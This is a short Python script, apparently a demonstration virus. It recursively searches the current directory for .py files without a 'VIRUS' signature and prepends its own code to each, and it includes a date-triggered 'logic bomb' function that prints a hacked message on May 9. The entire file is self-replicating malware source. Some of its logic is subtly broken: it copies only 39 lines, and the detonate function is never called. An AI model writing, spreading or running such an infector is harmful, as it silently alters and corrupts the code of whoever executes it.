#!/usr/bin/python3

# Imports the necessary libraries
import os
import datetime

# Defines the virus signature variable
SIGNATURE = "VIRUS"

# This function recursively searches for Python files in a given directory and its subdirectories
def locate(path):
    # Creating an empty list to store the targeted files
    files_targeted = []
    # Listing all files and directories in the given path
    filelist = os.listdir(path)
    # Looping through all files and directories
    for fname in filelist:
        # If the item is a directory recursively use function on the directory
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # Checks the last 3 characters of the filename and if the item ends it .py sets the variable infected to False
        elif fname[-3:] == ".py":
            infected = False
            # Loops through each line inside the file
            for line in open(path+"/"+fname):
                # If the signature (VIRUS) is found in any of the file lines, sets the variable infected to True
                if SIGNATURE in line:
                    infected = True
                    break
            # If the file is not infected, adds it to the list of targeted files
            if infected == False:
                files_targeted.append(path+"/"+fname)
    # Return the list of targeted files
    return files_targeted

# This function infects the targeted files by appending the virus code to them
def infect(files_targeted):
    # Opens the virus file and read its content
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        # Reads only the first 39 lines of the virus code
        if 0 <= i < 39:
            virusstring += line
    # Closes the virus file
    virus.close
    # Loops through each targeted file
    for fname in files_targeted:
        # Opens the file and read its content and save it to the temp variable
        f = open(fname)
        temp = f.read()
        f.close()
        # Opens the file in write mode and write the virus code followed by its original content that was saved under the variable temp
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Like a logic bomb, if it is May 9th prints a message
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locates all the Python files in the current directory and its subdirectories using absolute path
files_targeted = locate(os.path.abspath(""))
# Infects the targeted files with the virus code
infect(files_targeted)
